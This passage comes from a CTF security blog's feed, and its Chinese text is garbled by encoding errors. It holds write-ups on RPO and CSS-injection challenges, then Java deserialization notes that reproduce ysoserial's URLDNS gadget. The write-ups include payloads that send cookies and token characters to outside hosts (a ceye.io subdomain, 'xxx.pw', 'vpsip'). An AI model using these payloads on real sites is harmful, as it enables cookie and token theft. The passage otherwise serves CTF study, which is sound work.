&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">link&lt;/span> &lt;span style="color:#75af00">rel&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;prefetch&amp;#34;&lt;/span> &lt;span style="color:#75af00">href&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://7e4zw0.ceye.io/?flag=document.getElementById(frame).contentWindow.document.cookie&amp;#34;&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>prefetchå±æ€§è§„å®šäº†å½“å‰æ–‡æ¡£åœ¨é“¾æ¥æ–‡æ¡£ä¹‹å‰è¢«è°ƒç”¨ï¼Œè¿™æ ·å°±å¯ä»¥å¤–å¸¦å¯¹åº”è·¯å¾„ä¸‹çš„cookieäº†&lt;/p>
&lt;h2 id="pwnhub-0618å¤§ç‰©å¿…é¡»è¿‡">[pwnhub 0618]å¤§ç‰©å¿…é¡»è¿‡&lt;/h2>
&lt;p>&lt;a href="https://pwnhub.cn/media/writeup/113/29b7f18c-b1f2-4cfc-8f84-1b3793c52a7a_9f56fde2.pdf">wp&lt;/a> | &lt;a href="https://blog.csdn.net/Fly_hps/article/details/80613543">wp2&lt;/a>&lt;/p>
&lt;p>report_bug.phpé¡µé¢å¯ä»¥æäº¤linkï¼Œclasses.phpé¡µé¢å¼•å…¥cssæ—¶ä½¿ç”¨äº†ç›¸å¯¹è·¯å¾„è¿›è¡ŒåŠ è½½&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">linkrel&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">=&amp;#34;&lt;/span>&lt;span style="color:#75af00">stylesheet&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;#34;&lt;/span>&lt;span style="color:#75af00">type&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;text/css&amp;#34;&lt;/span>&lt;span style="color:#75af00">href&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;../../classes.css&amp;#34;&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä¸ä¸Šé¢çš„æ€è·¯ç›¸åŒï¼Œpayload&lt;/p>
&lt;pre tabindex="0">&lt;code>http://52.80.19.55/user.php/69/0/..%2f..%2f..%2fclasses.php/0
&lt;/code>&lt;/pre>&lt;p>å½“è®¿é—®è¿™ä¸ªurlæ—¶ï¼Œclasses.cssä¼šè¢«/user.php/69å¯¹åº”çš„å†…å®¹æ‰€è¦†ç›–&lt;/p>
&lt;p>è‡³äºpayloadçš„å†…å®¹ï¼Œä¸åŒäºæˆ‘ä»¬å¸¸è§çš„js payload&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-css" data-lang="css">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#111">{}&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#00a8c8">background-image&lt;/span>&lt;span style="color:#111">:&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">http://vpsip&lt;/span>&lt;span style="color:#111">);}&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#111">{}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="36c3ctf-2018urlstorage">[36c3CTF 2018]urlstorage&lt;/h2>
&lt;p>&lt;a href="https://github.com/eboda/34c3ctf/tree/master/urlstorage">dockerfile&lt;/a> | &lt;a href="https://www.cnblogs.com/iamstudy/articles/2017_34C4_web_urlstorage_writeup.html">wp&lt;/a> ï¼ˆç”±äºdockerfileç”¨çš„ubuntu17 æ— æ³•å¤ç°ï¼‰&lt;/p>
&lt;p>é¡µé¢çš„cssåŠ è½½ä½¿ç”¨ç›¸å¯¹è·¯å¾„ï¼ˆå¯ä»¥è¿›è¡Œrpo æ§åˆ¶cssï¼‰ï¼Œcspä¿¡æ¯å¦‚ä¸‹&lt;/p>
&lt;pre tabindex="0">&lt;code>frame-ancestors &amp;#39;none&amp;#39;; form-action &amp;#39;self&amp;#39;; connect-src &amp;#39;self&amp;#39;; script-src &amp;#39;self&amp;#39;; font-src &amp;#39;self&amp;#39; ; style-src &amp;#39;self&amp;#39;;
&lt;/code>&lt;/pre>&lt;p>/urlstorageå¤„å¯ä»¥æäº¤nameå’Œurlï¼Œå­˜åœ¨csrfï¼ˆå¯ä»¥ä»»æ„ä¿®æ”¹ä»–äººçš„urlï¼‰&lt;/p>
&lt;p>/flag?token=xxxå¤„å­˜åœ¨xss&lt;/p>
&lt;p>æ€è·¯ï¼šé€šè¿‡å¯ä»¥è¦†ç›–çš„cssä¿¡æ¯æ¨¡ç³ŠåŒ¹é…/çˆ†ç ´å‡ºflag&lt;/p>
&lt;p>é¦–å…ˆæ˜¯çˆ†ç ´tokenï¼Œç¬¬ä¸€ä½å­—ç¬¦ï¼š&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-css" data-lang="css">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">a&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#f92672">href&lt;/span>&lt;span style="color:#f92672">^=&lt;/span>&lt;span style="color:#f92672">flag&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#f92672">?&lt;/span>&lt;span style="color:#f92672">token&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#f92672">0&lt;/span>&lt;span style="color:#f92672">]&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#00a8c8">background&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">//xxx.pw/rpo/?c=1&lt;/span>&lt;span style="color:#111">);}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">a&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#f92672">href&lt;/span>&lt;span style="color:#f92672">^=&lt;/span>&lt;span style="color:#f92672">flag&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#f92672">?&lt;/span>&lt;span style="color:#f92672">token&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#f92672">1&lt;/span>&lt;span style="color:#f92672">]&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#00a8c8">background&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">//xxx.pw/rpo/?c=1&lt;/span>&lt;span style="color:#111">);}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">a&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#f92672">href&lt;/span>&lt;span style="color:#f92672">^=&lt;/span>&lt;span style="color:#f92672">flag&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#f92672">?&lt;/span>&lt;span style="color:#f92672">token&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#f92672">f&lt;/span>&lt;span style="color:#f92672">]&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#00a8c8">background&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">//xxx.pw/rpo/?c=f&lt;/span>&lt;span style="color:#111">);}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç¬¬äºŒä½å­—ç¬¦ï¼š&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-css" data-lang="css">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">a&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#f92672">href&lt;/span>&lt;span style="color:#f92672">^=&lt;/span>&lt;span style="color:#f92672">flag&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#f92672">?&lt;/span>&lt;span style="color:#f92672">token&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#f92672">10&lt;/span>&lt;span style="color:#f92672">]&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#00a8c8">background&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">//xxx.pw/rpo/?c=10&lt;/span>&lt;span style="color:#111">);}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">a&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#f92672">href&lt;/span>&lt;span style="color:#f92672">^=&lt;/span>&lt;span style="color:#f92672">flag&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#f92672">?&lt;/span>&lt;span style="color:#f92672">token&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#f92672">11&lt;/span>&lt;span style="color:#f92672">]&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#00a8c8">background&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">//xxx.pw/rpo/?c=11&lt;/span>&lt;span style="color:#111">);}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>åŒ¹é…flagæ—¶çš„å‘ç‚¹åœ¨äºcssé€‰æ‹©å™¨åœ¨åŒ¹é…çš„æ—¶å€™é¦–å­—ç¬¦ä¸èƒ½æ˜¯æ•°å­—ï¼Œè€Œflagçš„å¼€å¤´ä¸º&lt;code>34c3&lt;/code>ï¼Œæ‰€ä»¥ä½¿ç”¨cssçš„æ¨¡ç³ŠåŒ¹é…&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-css" data-lang="css">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">#&lt;/span>&lt;span style="color:#111">flag&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#f92672">value&lt;/span>&lt;span style="color:#f92672">*=&lt;/span>&lt;span style="color:#f92672">C3_1&lt;/span>&lt;span style="color:#f92672">]&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#00a8c8">background&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">http://xxx.pw/?flag=C3_1&lt;/span>&lt;span style="color:#111">);}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>æˆ–è€…16è¿›åˆ¶ç¼–ç &lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-css" data-lang="css">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">#&lt;/span>&lt;span style="color:#111">flag&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#f92672">value&lt;/span>&lt;span style="color:#f92672">^=&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#f92672">33&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#f92672">34&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#f92672">43&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#f92672">33&lt;/span>&lt;span style="color:#f92672">]&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#00a8c8">background&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">http://xxx.pw/?34c3&lt;/span>&lt;span style="color:#111">);}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä¹‹ååˆ©ç”¨ä¹‹å‰çš„xssç‚¹ä¿®æ”¹baseæ ‡ç­¾è¿›è¡Œrpoï¼Œè·å–flag&lt;/p>
&lt;pre tabindex="0">&lt;code>http://192.168.42.134:8080/flag?token=cdebcc090a8b4e339b876c33ad1c0acb%3C/title%3E%3Cbase%20href=urlstorage/123%3E
&lt;/code>&lt;/pre></description></item><item><title>Javaå­¦ä¹ ç¬”è®°â…¢</title><link>https://amiaaaz.github.io/2022/03/23/java-study-notes-03/</link><pubDate>Wed, 23 Mar 2022 18:40:31 +0800</pubDate><guid>https://amiaaaz.github.io/2022/03/23/java-study-notes-03/</guid><description>&lt;h2 id="åºåˆ—åŒ–ååºåˆ—åŒ–">åºåˆ—åŒ–&amp;amp;ååºåˆ—åŒ–&lt;/h2>
&lt;p>ä¸PHPç±»ä¼¼ï¼Œjavaçš„&lt;code>readObject&lt;/code>å¯¹æ ‡&lt;code>__wakeup&lt;/code>ï¼Œä½†ä¸å®Œå…¨ä¸€æ ·ï¼Œ&lt;code>readObject&lt;/code>å€¾å‘äºè§£å†³â€œååºåˆ—åŒ–æ—¶å¦‚ä½•è¿˜åŸä¸€ä¸ªå®Œæ•´å¯¹è±¡â€è¿™ä¸ªé—®é¢˜ï¼Œè€ŒPHPçš„&lt;code>__wakeup&lt;/code>å€¾å‘äºè§£å†³â€œååºåˆ—åŒ–åå¦‚ä½•åˆå§‹åŒ–è¿™ä¸ªå¯¹è±¡â€çš„é—®é¢˜ï¼Œå®ƒå¯ä»¥åœ¨ååºåˆ—åŒ–ä¹‹åæ‰§è¡Œåˆå§‹åŒ–æ“ä½œï¼Œè¯¥èµ‹çš„å€¼åŸºæœ¬ç”±&lt;code>__construct&lt;/code>æ§åˆ¶ï¼ŒçœŸæ­£çš„å…¥æ‰‹ç‚¹ä¸€èˆ¬åœ¨&lt;code>__destruct&lt;/code>ä¸­&lt;/p>
&lt;p>å¯¹javaæ¥è¯´ï¼Œä¸€ä¸ªå¯åˆ©ç”¨çš„&lt;code>readObject&lt;/code>æ˜¯é“¾å­æœ€åˆçš„èµ·ç‚¹&lt;/p>
&lt;p>åœ¨åºåˆ—åŒ–å¯¹è±¡æ—¶ä¼šè°ƒç”¨å¯¹è±¡çš„&lt;code>writeObject&lt;/code>æ–¹æ³•ï¼Œå‚æ•°ç±»å‹æ˜¯&lt;code>ObjectOutputStream&lt;/code>ï¼Œè¿™ä¸ªç±»æœ‰ä¸€ä¸ª&lt;code>annotateClass&lt;/code>æ–¹æ³•ï¼Œå¯ä»¥é€šè¿‡é‡å†™è¿™ä¸ªæ–¹æ³•æ¥å‘åºåˆ—åŒ–åçš„æ•°æ®ä¸­å†™å…¥å†…å®¹ï¼Œè¿™ä¸ªå†…å®¹ä½äº&lt;code>objectAnnotation&lt;/code>ä¸­&lt;/p>
&lt;p>ç›¸åº”çš„ï¼Œååºåˆ—åŒ–æ—¶ä¼šè°ƒç”¨&lt;code>readObject&lt;/code>ï¼Œå¯ä»¥è¯»å‡ºå‰é¢å†™å…¥çš„å†…å®¹è¿›è¡Œå¤„ç†&lt;/p>
&lt;p>pythonçš„ååºåˆ—åŒ–å±å®³æœ€å¤§ï¼Œå¯ä»¥ç›´æ¥æ“æ§PVMæ ˆä¸Šçš„æŒ‡ä»¤&lt;/p>
&lt;h2 id="urldns">URLDNS&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">URLDNS&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">ObjectPayload&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#75af00">getObject&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">url&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">//Avoid DNS resolution during payload creation
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">//Since the field &amp;lt;code&amp;gt;java.net.URL.handler&amp;lt;/code&amp;gt; is transient, it will not be part of the serialized payload.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">URLStreamHandler&lt;/span> &lt;span style="color:#111">handler&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">SilentURLStreamHandler&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">HashMap&lt;/span> &lt;span style="color:#111">ht&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// HashMap that will contain the URL
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">URL&lt;/span> &lt;span style="color:#111">u&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">URL&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">url&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">handler&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// URL to use as the Key
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">ht&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">u&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">url&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Reflections&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">u&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;hashCode&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#111">1&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// During the put above, the URL&amp;#39;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">ht&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">PayloadRunner&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">run&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">URLDNS&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">/**
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * &amp;lt;p&amp;gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * using the serialized object.&amp;lt;/p&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> *
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * &amp;lt;b&amp;gt;Potential false negative:&amp;lt;/b&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * &amp;lt;p&amp;gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * second resolution.&amp;lt;/p&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">SilentURLStreamHandler&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">URLStreamHandler&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">URLConnection&lt;/span> &lt;span style="color:#75af00">openConnection&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">URL&lt;/span> &lt;span style="color:#111">u&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#00a8c8">synchronized&lt;/span> &lt;span style="color:#111">InetAddress&lt;/span> &lt;span style="color:#75af00">getHostAddress&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">URL&lt;/span> &lt;span style="color:#111">u&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¿™æ˜¯yoserialä¸­URLDNSéƒ¨åˆ†çš„æºç ï¼Œå¾ˆçŸ­&lt;/p>
&lt;p>æ•´ä¸ªé“¾å­çš„æ”»å‡»åˆ©ç”¨çš„æ˜¯HashMapä¼šè°ƒç”¨keyçš„hashCodeæ–¹æ³•æ¥å®šä½å¯¹åº”çš„valueï¼Œå½“url objectä½œä¸ºkeyæ—¶ä¼šç”±äºhashCodeçš„è®¡ç®—è¿›è€Œè§¦å‘DNSè¯·æ±‚ï¼ˆå› ä¸ºè¦è§£æhostnameæ˜¯å¦æŒ‡å‘åŒä¸€ä¸ªIp&lt;/p>
&lt;h3 id="hashmap">HashMap&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">readObject&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ObjectInputStream&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">ClassNotFoundException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ObjectInputStream&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">GetField&lt;/span> &lt;span style="color:#111">fields&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readFields&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Read loadFactor (ignore threshold)
